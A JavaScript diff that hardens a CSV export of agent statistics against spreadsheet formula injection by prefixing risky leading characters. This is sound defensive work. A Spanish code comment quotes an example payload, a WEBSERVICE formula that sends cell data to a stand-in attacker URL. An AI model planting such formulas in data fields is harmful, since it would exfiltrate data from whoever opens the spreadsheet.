@@ -175,11 +175,23 @@ export function buildAgentsCsv(agents, meta = {}) {
     'rating',
     'rating_count',
   ];
+  // BUG-224 (codex MEDIUM, 2026-05-18): prefijar el cell con `'` cuando
+  // empieza con un formula trigger char (`=`, `+`, `-`, `@`, tab, CR).
+  // Sin esto, Excel/LibreOffice/Google Sheets interpretan el cell como
+  // fórmula al abrir el CSV — un agent malicioso podía setear su
+  // `display_name` a `=WEBSERVICE("https://attacker/?x="&A1)` y exfiltrar
+  // datos del sheet del owner. El doubling de `"` no es suficiente.
+  const safeCell = (value) => {
+    const raw = String(value ?? '');
+    const dangerous = raw.length > 0 && '=+-@\t\r'.includes(raw[0]);
+    const escaped = (dangerous ? "'" : '') + raw.replace(/"/g, '""');
+    return `"${escaped}"`;
+  };
   const lines = [header.join(',')];
   for (const row of items) {
-    const name = (row.display_name || row.email || '').replace(/"/g, '""');
+    const name = row.display_name || row.email || '';
     const values = [
-      `"${name}"`,
+      safeCell(name),
       num(row.messages_sent),
       num(row.handoffs_resolved),
       num(row.handoffs_accepted),
